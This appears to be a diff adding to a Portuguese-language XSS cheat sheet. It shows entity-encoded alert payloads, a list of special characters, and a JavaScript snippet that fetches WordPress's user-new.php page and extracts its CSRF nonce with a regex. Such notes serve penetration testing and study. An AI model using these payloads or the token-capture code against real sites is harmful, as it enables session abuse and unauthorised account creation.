@@ -247,3 +247,26 @@ data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('teste')
 
 <img src=x onerror="vb&#x63;cript:alert('teste')">
 ```
+
+## Special Caracters
+```
+"<" ">" usado para elementos/componentes no HTML
+
+"{" "}" usado para declarar uma função
+
+'' "" usado para definir string
+
+; final do bloco de código
+```
+
+## XSS Captura de Token
+```
+## Exemplo
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php"; ### Faz o request
+var nonceRegex = /ser" value="([^"]*?)"/g; ### Captura o token entre o recurso /ser e value de acordo com o regex alfanumérico
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+```
